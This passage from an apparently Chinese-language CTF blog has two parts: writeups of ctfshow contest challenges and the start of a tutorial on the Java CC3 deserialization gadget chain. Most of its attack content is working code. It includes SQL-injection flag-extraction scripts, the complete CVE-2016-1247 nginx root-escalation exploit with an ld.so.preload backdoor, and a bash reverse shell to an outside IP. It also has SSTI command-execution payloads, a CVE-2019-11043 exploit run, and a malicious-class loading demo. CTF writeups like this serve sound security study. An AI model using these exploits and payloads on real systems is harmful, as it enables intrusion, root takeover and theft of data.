\n?>\n```\n\n```php\n//user.php\n<?php\ninclude('db.php');\nsession_start();\nerror_reporting(0);\nif($_SESSION['u']){\n$username=$_SESSION['u'];\n\nif (is_numeric($username))\n\t{\t\n\t\tif(strlen($username)>10) {\n\t\t\t$username=substr($username,0,10);\n\t\t}\n\t\techo \"Hello $username,there's nothing here but dog food!\";\n\t}\n\telse{\n\t\techo \"<script>alert('The username can only be a number.How did you get here?go out!!!');location.href='login.php';</script>\";\n}\n}\nelse{\n\t\techo \"<script>alert('Login first!');location.href='login.php';</script>\";\n}\n?>\n```\n\n登录界面的过滤挺多的，但是在注册界面的过滤就比较少了，从user.php中可以看到唯一的回显位就是username了，并且要求username只能为数字，我们用hex函数绕过就行了，并且这里需要两层hex编码，不然会出现字母，然后切片去绕过长度限制就行了\n\n关注到注册界面的插入语句\n\n```php\n$sql =\n\"insert into test1\nset email = '$e', \nusername = '$u',\npassword = '$p'\n\";\n```\n\n这里的话可以直接在email中插入username的执行语句，然后把后面的注释掉就行\n\npayload\n\n```php\n\"insert into test1\nset email = '1',username=hex(hex(substr((select/**/database()),1,1))),/*', \nusername = '*/#',\npassword = '1'\n\"\n```\n\n这里的话因为是多行语句，后面的password是不会被注释的\n\n我们测试一下\n\n```python\nimport requests\nimport re\n\nurl1 = \"http://aecbccb7-cd79-483d-9aad-270fcad87a25.challenge.ctf.show/register.php\"\nurl2 = \"http://aecbccb7-cd79-483d-9aad-270fcad87a25.challenge.ctf.show/login.php\"\ntarget = \"\"\n\n\ndata1 = {\n    \"e\": \"100@2\" + f\"',username=hex(hex(substr((select/**/database()),1,1))),/*\",\n    \"u\": \"*/#\",\n    \"p\": 100\n}\n#r1 = requests.post(url1, data=data1)\ndata2 = {\n    \"e\" : \"100@2\",\n    \"p\" : 100\n}\nr2 = requests.post(url2, data=data2)\nmatch = re.search(r\"Hello (\\d+)\", r2.text)\nprint(bytes.fromhex(bytes.fromhex(match.group(1)).decode()).decode())\n#w\n```\n\n提取字符串的部分就不说了，自己可以去搜一下\n\npoc\n\n```python\nimport requests\nimport re\n\nurl1 = \"http://aecbccb7-cd79-483d-9aad-270fcad87a25.challenge.ctf.show/register.php\"\nurl2 = \"http://aecbccb7-cd79-483d-9aad-270fcad87a25.challenge.ctf.show/login.php\"\ntarget = \"\"\n\nfor i in range(1,50):\n    payload = f\"',username=hex(hex(substr((select/**/flag/**/from/**/flag),{i},1))),/*\"\n    data1 = {\n        \"e\": str(i) + payload,\n        \"u\": \"*/#\",\n        \"p\": i\n    }\n    r1 = requests.post(url1, data=data1)\n    data2 = {\n        \"e\" : i,\n        \"p\" : i\n    }\n    r2 = requests.post(url2, data=data2)\n    match = re.search(r\"Hello (\\d+)\", r2.text)\n    target += bytes.fromhex(bytes.fromhex(match.group(1)).decode()).decode()\n    print(target)\n```\n\n## 出题人不想跟你说话.jpg\n\n### #CVE-2016-1247\n\n![image-20250619151643852](../image/achieve/202411/内部赛/image-20250619151643852.png)\n\n意思很明显了，连马，密码是cai，传参试一下就知道了\n\n![image-20250619151741142](../image/achieve/202411/内部赛/image-20250619151741142.png)\n\n看禁用函数没看到system被禁用，本来想直接RCE读flag的，但是貌似有权限问题，算了，蚁剑连上去看看吧\n\n查看suid文件没看到什么可以拿来提权的，结合题目提示每两分钟触发一次，那可能是有个定时任务\n\n```\n(www-data:/var/www/html) $ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# m h dom mon dow user    command\n17 *    * * *    root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n*/1 *    * * *    root    /usr/sbin/logrotate -vf /etc/logrotate.d/nginx\n```\n\n看到一个自定义任务每分钟触发一次\n\n```php\n*/1 *    * * *    root    /usr/sbin/logrotate -vf /etc/logrotate.d/nginx\n```\n\n以 root 用户身份执行 `logrotate` 命令，对 `/etc/logrotate.d/nginx` 配置文件强制（`-f`）执行 Nginx 的日志轮转，并显示详细信息（`-v`）。\n\n有一个CVE-2016-1247https://nvd.nist.gov/vuln/detail/cve-2016-1247，一个利用nginx日志进行提权的漏洞\n\n看看nginx的版本\n\n```php\n(www-data:/var/www/html) $ nginx -v\nnginx version: nginx/1.4.6 (Ubuntu)\n```\n\n在漏洞版本中，那直接拿poc打就行了\n\n在vps中创建一个nginx-root.sh文件，记得是在Linux下，Windows下貌似有问题\n\n```sh\n------------[ nginxed-root.sh ]--------------\n \n#!/bin/bash\n#\n# Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit\n# nginxed-root.sh (ver. 1.0)\n#\n# CVE-2016-1247\n#\n# Discovered and coded by:\n#\n# Dawid Golunski\n# dawid[at]legalhackers.com\n#\n# https://legalhackers.com\n#\n# Follow https://twitter.com/dawid_golunski for updates on this advisory.\n#\n# ---\n# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu\n# etc.) to escalate their privileges from nginx web server user (www-data) to root \n# through unsafe error log handling.\n#\n# The exploit waits for Nginx server to be restarted or receive a USR1 signal.\n# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)\n# script which is called daily by the cron.daily on default installations.\n# The restart should take place at 6:25am which is when cron.daily executes.\n# Attackers can therefore get a root shell automatically in 24h at most without any admin\n# interaction just by letting the exploit run till 6:25am assuming that daily logrotation \n# has been configured. \n#\n#\n# Exploit usage:\n# ./nginxed-root.sh path_to_nginx_error.log \n#\n# To trigger logrotation for testing the exploit, you can run the following command:\n#\n# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx\n#\n# See the full advisory for details at:\n# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html\n#\n# Video PoC:\n# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html\n#\n#\n# Disclaimer:\n# For testing purposes only. Do no harm.\n#\n \nBACKDOORSH=\"/bin/bash\"\nBACKDOORPATH=\"/tmp/nginxrootsh\"\nPRIVESCLIB=\"/tmp/privesclib.so\"\nPRIVESCSRC=\"/tmp/privesclib.c\"\nSUIDBIN=\"/usr/bin/sudo\"\n \nfunction cleanexit {\n    # Cleanup \n    echo -e \"\\n[+] Cleaning up...\"\n    rm -f $PRIVESCSRC\n    rm -f $PRIVESCLIB\n    rm -f $ERRORLOG\n    touch $ERRORLOG\n    if [ -f /etc/ld.so.preload ]; then\n        echo -n > /etc/ld.so.preload\n    fi\n    echo -e \"\\n[+] Job done. Exiting with code $1 \\n\"\n    exit $1\n}\n \nfunction ctrl_c() {\n        echo -e \"\\n[+] Ctrl+C pressed\"\n    cleanexit 0\n}\n \n#intro \n \ncat <<_eascii_\n _______________________________\n< Is your server (N)jinxed ? ;o >\n -------------------------------\n           \\ \n            \\          __---__\n                    _-       /--______\n               __--( /     \\ )XXXXXXXXXXX\\v.  \n             .-XXX(   O   O  )XXXXXXXXXXXXXXX- \n            /XXX(       U     )        XXXXXXX\\ \n          /XXXXX(              )--_  XXXXXXXXXXX\\ \n         /XXXXX/ (      O     )   XXXXXX   \\XXXXX\\ \n         XXXXX/   /            XXXXXX   \\__ \\XXXXX\n         XXXXXX__/          XXXXXX         \\__---->\n ---___  XXX__/          XXXXXX      \\__         /\n   \\-  --__/   ___/\\  XXXXXX            /  ___--/=\n    \\-\\    ___/    XXXXXX              '--- XXXXXX\n       \\-\\/XXX\\ XXXXXX                      /XXXXX\n         \\XXXXXXXXX   \\                    /XXXXX/\n          \\XXXXXX      >                 _/XXXXX/\n            \\XXXXX--__/              __-- XXXX/\n             -XXXXXXXX---------------  XXXXXX-\n                \\XXXXXXXXXXXXXXXXXXXXXXXXXX/\n                  \"\"VXXXXXXXXXXXXXXXXXXV\"\"\n_eascii_\n \necho -e \"\\033[94m \\nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \\nnginxed-root.sh (ver. 1.0)\\n\"\necho -e \"Discovered and coded by: \\n\\nDawid Golunski \\nhttps://legalhackers.com \\033[0m\"\n \n# Args\nif [ $# -lt 1 ]; then\n    echo -e \"\\n[!] Exploit usage: \\n\\n$0 path_to_error.log \\n\"\n    echo -e \"It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\\n\"\n    exit 3\nfi\n \n# Priv check\n \necho -e \"\\n[+] Starting the exploit as: \\n\\033[94m`id`\\033[0m\"\nid | grep -q www-data\nif [ $? -ne 0 ]; then\n    echo -e \"\\n[!] You need to execute the exploit as www-data user! Exiting.\\n\"\n    exit 3\nfi\n \n# Set target paths\nERRORLOG=\"$1\"\nif [ ! -f $ERRORLOG ]; then\n    echo -e \"\\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\\n\"\n    exit 3\nfi\n \n# [ Exploitation ]\n \ntrap ctrl_c INT\n# Compile privesc preload library\necho -e \"\\n[+] Compiling the privesc shared library ($PRIVESCSRC)\"\ncat <<_solibeof_>$PRIVESCSRC\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <dlfcn.h>\n       #include <sys/types.h>\n       #include <sys/stat.h>\n       #include <fcntl.h>\nuid_t geteuid(void) {\n    static uid_t  (*old_geteuid)();\n    old_geteuid = dlsym(RTLD_NEXT, \"geteuid\");\n    if ( old_geteuid() == 0 ) {\n        chown(\"$BACKDOORPATH\", 0, 0);\n        chmod(\"$BACKDOORPATH\", 04777);\n        unlink(\"/etc/ld.so.preload\");\n    }\n    return old_geteuid();\n}\n_solibeof_\n/bin/bash -c \"gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl\"\nif [ $? -ne 0 ]; then\n    echo -e \"\\n[!] Failed to compile the privesc lib $PRIVESCSRC.\"\n    cleanexit 2;\nfi\n \n \n# Prepare backdoor shell\ncp $BACKDOORSH $BACKDOORPATH\necho -e \"\\n[+] Backdoor/low-priv shell installed at: \\n`ls -l $BACKDOORPATH`\"\n \n# Safety check\nif [ -f /etc/ld.so.preload ]; then\n    echo -e \"\\n[!] /etc/ld.so.preload already exists. Exiting for safety.\"\n    exit 2\nfi\n \n# Symlink the log file\nrm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG\nif [ $? -ne 0 ]; then\n    echo -e \"\\n[!] Couldn't remove the $ERRORLOG file or create a symlink.\"\n    cleanexit 3\nfi\necho -e \"\\n[+] The server appears to be \\033[94m(N)jinxed\\033[0m (writable logdir) ! :) Symlink created at: \\n`ls -l $ERRORLOG`\"\n \n# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered\ncurl http://localhost/ >/dev/null 2>/dev/null\n# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily \n# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)\necho -ne \"\\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...\"\nwhile :; do \n    sleep 1\n    if [ -f /etc/ld.so.preload ]; then\n        echo $PRIVESCLIB > /etc/ld.so.preload\n        rm -f $ERRORLOG\n        break;\n    fi\ndone\n \n# /etc/ld.so.preload should be owned by www-data user at this point\n# Inject the privesc.so shared library to escalate privileges\necho $PRIVESCLIB > /etc/ld.so.preload\necho -e \"\\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \\n`ls -l /etc/ld.so.preload`\"\necho -e \"\\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload\"\necho -e \"\\n[+] The /etc/ld.so.preload file now contains: \\n`cat /etc/ld.so.preload`\"\nchmod 755 /etc/ld.so.preload\n \n# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)\necho -e \"\\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!\"\nsudo 2>/dev/null >/dev/null\n \n# Check for the rootshell\nls -l $BACKDOORPATH\nls -l $BACKDOORPATH | grep rws | grep -q root\nif [ $? -eq 0 ]; then \n    echo -e \"\\n[+] Rootshell got assigned root SUID perms at: \\n`ls -l $BACKDOORPATH`\"\n    echo -e \"\\n\\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\\033[0m\"\nelse\n    echo -e \"\\n[!] Failed to get root\"\n    cleanexit 2\nfi\n \nrm -f $ERRORLOG\necho > $ERRORLOG\n \n# Use the rootshell to perform cleanup that requires root privilges\n$BACKDOORPATH -p -c \"rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB\"\n# Reset the logging to error.log\n$BACKDOORPATH -p -c \"kill -USR1 `pidof -s nginx`\"\n \n# Execute the rootshell\necho -e \"\\n[+] Spawning the rootshell $BACKDOORPATH now! \\n\"\n$BACKDOORPATH -p -i\n \n# Job done.\ncleanexit 0\n \n---------------------------------------------------\n```\n\n编写好后上传\n\n![image-20250619153851477](../image/achieve/202411/内部赛/image-20250619153851477.png)\n\n弹一下shell，因为蚁剑搞不了\n\n```php\nnc -lvvp 2333\nbash -i >& /dev/tcp/124.223.25.186/2333 0>&1\n```\n\n![image-20250619154430760](../image/achieve/202411/内部赛/image-20250619154430760.png)\n\n然后我们运行poc\n\n```php\nchmod 777 nginx-root.sh\n./nginx-root.sh\n./nginx-root.sh /var/log/nginx/error.log\n```\n\n然后等漏洞触发就行了\n\n## 蓝瘦\n\n### #session伪造+ssti\n\n源码中有提示\n\n```html\n<!-- param: ctfshow -->\n<!-- key: ican -->\n```\n\n随便传入登录后拿到一个session，拿去解密一下\n\n```bash\nroot@VM-16-12-ubuntu:/opt# flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6IjEifQ.aFPB_g.bV4sOfL5y_NOx7N4ecN_UIDgYjg'\n{'username': '1'}\n```\n\n拿刚刚的key伪造admin\n\n```bash\n{'username': 'admin'}\nroot@VM-16-12-ubuntu:/opt# flask-unsign --sign --cookie \"{'username': 'admin'}\" --secret 'ican'\neyJ1c2VybmFtZSI6ImFkbWluIn0.aFPDPA.2HMyFMZ43QWEj7QrA9KrUsrpGT4\n```\n\n传入后需要传入一个ctfshow参数，测试发现是ssti\n\n```php\n?ctfshow={{\"\".__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__['eval'](\"__import__('os').popen('whoami').read()\")}}\nctf\n?ctfshow={{\"\".__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__['eval'](\"__import__('os').popen('env').read()\")}}\nflag在环境变量中\n```\n\n## 一览无余\n\n### #CVE-2019-11043\n\n啥都没有，找找CVE吧，找到PHP/7.1.33的CVE-2019-11043，我复现文章在https://wanth3f1ag.top/2025/03/24/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/\n\n直接上漏洞利用工具phuip-fpizdam一把梭\n\n```bash\nroot@VM-16-12-ubuntu:/opt/漏洞工具/phuip-fpizdam# go run . \"http://d6add9ec-0044-4b0b-96c9-e5a379251c38.challenge.ctf.show/index.php\"\n2025/06/19 16:13:06 Base status code is 200\n2025/06/19 16:13:06 Status code 502 for qsl=1765, adding as a candidate\n2025/06/19 16:13:06 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]\n2025/06/19 16:13:11 Attack params found: --qsl 1755 --pisos 189 --skip-detect\n2025/06/19 16:13:11 Trying to set \"session.auto_start=0\"...\n2025/06/19 16:13:11 Detect() returned attack params: --qsl 1755 --pisos 189 --skip-detect <-- REMEMBER THIS\n2025/06/19 16:13:11 Performing attack using php.ini settings...\n2025/06/19 16:13:12 Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'&\" to URLs\n2025/06/19 16:13:12 Trying to cleanup /tmp/a...\n2025/06/19 16:13:12 Done!\n```\n\n然后我们传入参数a执行命令\n\n```bash\n?a=id\n```\n\n注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。\n\n![image-20250619161419956](../image/achieve/202411/内部赛/image-20250619161419956.png)\n\n然后读flag就行\n\n```bash\n?a=cat fl0gHe1e.txt\n```\n\n## 登陆就有flag\n\n这里的话利用**空异或0会查到所有非数字开头的记录**，并且这里长度有限制\n\npayload\n\n```php\n'^0#   '^''#   '<>1#   '<1#   '&0#   '<<0#   '>>0#   '&''#   '/9#\n```\n\n## 签退\n\n### #变量覆盖\n\n绕过或者变量覆盖\n\n```php\n?S=a;system('whoami');\n?S=a=system('whoami');\n```\n\n","tags":["内部赛"],"categories":["ctfshow"]},{"title":"Java反序列化CC3链","url":"/2025/06/18/Java反序列化CC3链/","content":"\n## 回顾\n\n前面分别学习了CC1和CC6利用反射触发Runtime.getRuntime().exec()去执行命令的，但是往往很多时候代码中的黑名单都会选择禁用Runtime，此时又该怎么做呢？\n\nCC3链就是一种很好的解决方法，他不借助Runtime类中的exec去执行命令，而是**利用类加载机制，动态加载恶意类来实现自动执行恶意类代码**\n\n## 0x01类加载机制\n\n参考文章：[Java基础篇-类加载机制](https://www.cnblogs.com/1vxyz/p/17245206.html)\n\n在了解类加载机制之前，我们首先要知道java文件的编译的过程\n\n### java文件的编译\n\nJava文件编译过程主要包括两个阶段，第一阶段是在编译阶段编译成Java字节码的过程，在书中常常被叫做前端编译器，例如我们最熟悉的javac编译器；第二阶段（可选）就是在运行的时候，通过JVM的编译优化组件，对代码中的部分代码编译成本地代码，也就是JIT编译，例如HotSpot中的C1、C2编译器，这里我借助ai对整个编译过程进行展示\n\n![image-20250617140626108](../image/achieve/202411/java学习/image-20250617140626108.png)\n\n我们分别介绍：\n\n- 词法分析：将源代码字符流分解成有意义的词法单元，也就是Tokens流。具体的过程：\n\n1. 读取`.java`文件字符流\n2. 识别关键字（`class`, `public`等）、标识符（类名、变量名）、运算符、字面量等\n\n- 语法分析：根据Java语法规则构建抽象语法树（AST）。具体的过程：\n\n1. 检查Token序列是否符合Java语法\n2. 构建树状结构表示代码的层次关系\n\n- 注解处理：作用是处理源代码中的注解（例如重写方法的@Override），具体的过程：\n\n1. 执行自定义注解处理器\n2. 可能生成新的源代码（如Lombok生成getter/setter）\n3. 循环处理直到无新文件生成\n\n- 生成字节码并写入.class文件：将AST语法树转化成JVM指令后写入文件\n\n### 类加载过程\n\n**Class 文件需要加载到虚拟机中之后才能运行和使用，如果在原先并没有发现类的话则会启用类加载器去加载类并使用**\n\n系统加载 Class 类型的文件主要三步：**加载->连接->初始化**。连接过程又可分为三步：**验证->准备->解析**。\n\n- 加载：\n\n![image-20250617141209615](../image/achieve/202411/java学习/image-20250617141209615.png)\n\n类加载的过程主要会完成三件事：\n\n- 通过全限定名获取定义此类的二进制字节流。\n- 将字节流所代表的静态存储结构转换为方法区的运行时数据结构。\n- 在堆中生成`java.lang.Class`对象\n\n加载主要是靠我们的类加载器去完成的，类加载器有很多种，当我们想要加载一个类的时候，具体是哪个类加载器加载由 **双亲委派模型** 决定。并且每个Java类都会有一个引用指向加载它的ClassLoader\n\n双亲委派机制类加载访问流程：\n\nClassLoader —-> SecureClassLoader —> URLClassLoader —-> APPClassLoader —-> loadClass() —-> findClass()\n\n- 验证：这里的话主要是为了确保Class文件中的字节流信息符合规范，保证这些信息被当作代码运行后不会损害到Java虚拟机的安全\n\n1. 文件格式验证（Class 文件格式检查）\n2. 元数据验证（字节码语义检查）\n3. 字节码验证（程序语义检查）\n4. 符号引用验证（类的正确性检查）\n\n- 准备：这个阶段是**正式为类变量分配内存并设置类变量初始值的阶段**，这些内存都将在方法区中分配\n\n需要注意的是：这时候进行的内存分配仅仅包括类变量，也就是静态变量（static关键字修饰的变量）\n\n- 解析：此过程**是虚拟机将常量池内的符号引用替换为直接引用的过程**，主要是解析类/接口、字段、方法等引用\n\n举个例子：在程序执行方法的时候，系统需要明确知道这个方法所在的位置，而Java虚拟机会为每个类都准备一个方法表来存放类中所有的方法。所以当我们需要调用一个类的方法的时候，只要知道这个方法在方法表中的位置（即偏移量）就可以直接调用该方法了。通过解析符号引用就可以直接转化成目标方法在类中方法表的位置，从而使得该方法被调用\n\n- 初始化：执行类构造器`<clinit>()`方法、按代码顺序初始化静态变量、执行静态代码块\n- 类卸载：GC回收机制，这个很简单\n\n其实从上面的分析中我们不难看出，在类加载过程的初始化步骤中会执行静态代码块，**java的类加载机制，可以让类初始化时，会执行static静态区里的代码**，这也给了我们一线生机，例如我们这里拿URLClassLoader类加载器测试一下\n\n首先写一个恶意类\n\n```java\npackage CC3;\n\nimport java.io.IOException;\n\npublic class URLClassLoader_test {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (IOException e){\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n然后用javac编译生成.class文件`javac URLClassLoader_test.java`\n\n然后我们写一个动态加载类\n\n```java\npackage CC3;\n\nimport java.lang.reflect.InvocationTargetException;\nimport java.net.MalformedURLException;\nimport java.net.URLClassLoader;\nimport java.net.URL;\n\npublic class URLClassLoader_load_class {\n    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException{\n\n        //URLClassLoader加载器需要传入一个url加载类\n        URLClassLoader urlClassLoader = new URLClassLoader(new URL[] {new URL(\"file:E:\\\\java\\\\JavaSec\\\\CC1\\\\src\\\\main\\\\POC\\\\\")});\n        Class<?> c = urlClassLoader.loadClass(\"CC3.URLClassLoader_test\");\n        c.newInstance();\n    }\n}\n```\n\n这里的话通过URLClassLoader加载器去动态加载类并初始化类对象，这里在初始化的时候执行了static静态区里面的代码，从而执行恶意命令\n\n![image-20250617145555669](../image/achieve/202411/java学习/image-20250617145555669.png)\n\n## 0x02 影响版本\n\n- jdk8u65\n- Commons-Collections <= 3.2.1\n\n## 0x03 链子分析\n\n前面介绍了类加载机制的基础知识，我们这里还需要介绍一个点：\n\n当 ClassLoader 加载一个类时,它会调用自身的 defineClass() 方法来将类的字节码转换为 Class 对象，这也是我们的入手点\n\n![image-20250617150859033](../image/achieve/202411/java学习/image-20250617150859033.png)\n\n需要注意一点\n\n此时的 `defineClass()` 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 `newInstance()` 的实例化。\n\n![image-20250617151047776](../image/achieve/202411/java学习/image-20250617151047776.png)\n\n并且此时是defineClass是protected类型的，并不是我们预期的利用方法，我们尝试寻找一下public属性的defineClass()方法\n\n然后在 `TemplatesImpl` 类的 `static final class TransletClassLoader extends ClassLoader` 中找到了我们能够运用的类。\n\n### TemplatesImpl#defineClass()\n\n![image-20250617151600287](../image/achieve/202411/java学习/image-20250617151600287.png)\n\n我们可以看到这个内部类继承了ClassLoader并且重写了defineClass方法，这里的话并没有写明是什么类型的方法，所以默认为default类型，可以在类中被调用，我们跟进一下这个方法的用法\n\n### TemplatesImpl#defineTransletClasses()\n\n在defineTransletClasses()方法下发现了这个方法被调用了\n\n![image-20250617152442918](../image/achieve/202411/java学习/image-20250617152442918.png)\n\n但是这个方法是private类型的，我们看看这个方法有没有被其他调用\n\n### TemplatesImpl#getTransletInstance()\n\n在`getTransletInstance()` 方法中\n\n![image-20250617152554089](../image/achieve/202411/java学习/image-20250617152554089.png)\n\n可以看到这里调用了defineTransletClasses()方法，前提是`_name`不为null并且`_class`为null\n\n从defineClass()方法到defineTransletClasses()方法再到getTransletInstance()方法，其实都是在同一个类TemplatesImpl中，并且在getTransletInstance()方法中还有一个newInstance()实例化的过程，所以如果能走完这个方法，就可以动态调用恶意类中的静态方法，但是该类还是私有的，还得继续找该类的用法\n\n### TemplatesImpl#newTransformer()\n\n在newTransformer()方法中\n\n![image-20250617160111177](../image/achieve/202411/java学习/image-20250617160111177.png)\n\n有调用getTransletInstance()方法，并且该方法还是public属性类型的，所以我们就可以直接用了\n\n### POC链子\n\n```java\nTemplatesImpl::newTransformer()->\n    TemplatesImpl::getTransletInstance()->\n        TemplatesImpl::defineTransletClasses()->\n            TemplatesImpl::defineClass()->\n                恶意类代码执行\n```\n\n## 0x04问题的解决\n\n我们写个demo来走一下调试\n\n```java\npackage CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\n\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\n\npublic class CC3 {\n    public static void main(String[] args) {\n        TemplatesImpl templates = new TemplatesImpl();\n        templates.newTransformer();\n\n    }\n}\n```\n\n打上断点进行debug\n\n![image-20250617163328476](../image/achieve/202411/java学习/image-20250617163328476.png)\n\n此时会进入486行代码，实例化一个对象并调用getTransletInstance()方法，接下来我们进入getTransletInstance()方法\n\n### 问题一：getTransletInstance()方法中的问题\n\n![image-20250617160338975](../image/achieve/202411/java学习/image-20250617160338975.png)\n\n这里有两层if语句才会执行defineTransletClasses()方法，一个是`_name`不能为null，一个是`_class`为null，我们看看这两个属性\n\n![image-20250617160514870](../image/achieve/202411/java学习/image-20250617160514870.png)\n\n是私有属性的变量，那我们可以通过反射去修改他们的值，我们看看构造方法\n\n```java\n    protected TemplatesImpl(byte[][] bytecodes, String transletName,\n        Properties outputProperties, int indentNumber,\n        TransformerFactoryImpl tfactory)\n    {\n        _bytecodes = bytecodes;\n        init(transletName, outputProperties, indentNumber, tfactory);\n    }\n```\n\n并没有对这两个变量进行赋初值操作，那我们正常用反射给`_name`一个String类型的值就行了\n\n改一下demo\n\n```java\npackage CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\n\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\n\npublic class CC3 {\n    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, TransformerConfigurationException {\n        TemplatesImpl templates = new TemplatesImpl();\n        Class<?> c = templates.getClass();\n        \n        //给_name进行赋值，让_name不为null\n        Field _name = c.getDeclaredField(\"_name\");\n        _name.setAccessible(true);\n        _name.set(templates,\"a\");\n        \n        templates.newTransformer();\n\n    }\n}\n\n```\n\n此时就可以通过两个if进入defineTransletClasses()方法了\n\n![image-20250617163553309](../image/achieve/202411/java学习/image-20250617163553309.png)\n\n### 问题二：defineTransletClasses()方法中的问题\n\n当我们继续程序的时候就会发现此时出现了一个异常\n\n![image-20250617165117206](../image/achieve/202411/java学习/image-20250617165117206.png)\n\n其实是因为我们没有对`_bytecodes`进行赋值导致的\n\n往下看可以看到\n\n![image-20250617161600964](../image/achieve/202411/java学习/image-20250617161600964.png)\n\n这里可以看到，在definClass方法的调用中`_bytecodes`变量是作为一个一维数组传入的，也就是我们需要执行的代码，但是在该变量的声明时\n\n```java\nprivate byte[][] _bytecodes = null;\n```\n\n这里声明的是二维数组，并且`_bytecodes[i]`是我们需要放入的恶意字节码，那我们修改刚刚的值为我们之前test测试时候的恶意类\n\n```java\npackage CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\n\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class CC3 {\n    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, TransformerConfigurationException {\n        TemplatesImpl templates = new TemplatesImpl();\n        Class<?> c = templates.getClass();\n\n        //给_name进行赋值\n        Field _name = c.getDeclaredField(\"_name\");\n        _name.setAccessible(true);\n        _name.set(templates,\"a\");\n        \n        //给_bytecodes赋值\n        Field _bytecodes = c.getDeclaredField(\"_bytecodes\");\n        _bytecodes.setAccessible(true);\n        byte[] evilCode = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\src\\\\main\\\\POC\\\\CC3\\\\URLClassLoader_test.class\"));//字节码文件的位置\n        byte[][] codes = {evilCode};\n        _bytecodes.set(templates,codes);\n        templates.newTransformer();\n\n    }\n}\n\n```\n\n运行后又发生了报错\n\n```java\nException in thread \"main\" java.lang.NullPointerException\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$1.run(Unknown Source)\n\tat java.security.AccessController.doPrivileged(Native Method)\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(Unknown Source)\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(Unknown Source)\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(Unknown Source)\n\tat CC3.CC3.main(CC3.java:25)\n```\n\n因为 **`TemplatesImpl` 在加载字节码时缺少必要的字段初始化**，通常是由于 `_tfactory` 未正确设置导致的。\n\n这个变量有一个修饰符叫transient，代表着这个属性是不能被序列化的，意思是反序列化不能给它赋值。\n\n![image-20250617165913953](../image/achieve/202411/java学习/image-20250617165913953.png)\n\n我们跟进看一下`_tfactory`的初始值，发现是null，难怪呢，这里没有调用到getExternalExtensionsMap()\n\n![image-20250617170011618](../image/achieve/202411/java学习/image-20250617170011618.png)\n\n我们跟进getExternalExtensionsMap()方法，发现该方法是属于TransformerFactoryImpl类的，试试能不能给`_tfactory`变量赋值为该类的实例化对象\n\n```java\npackage CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport 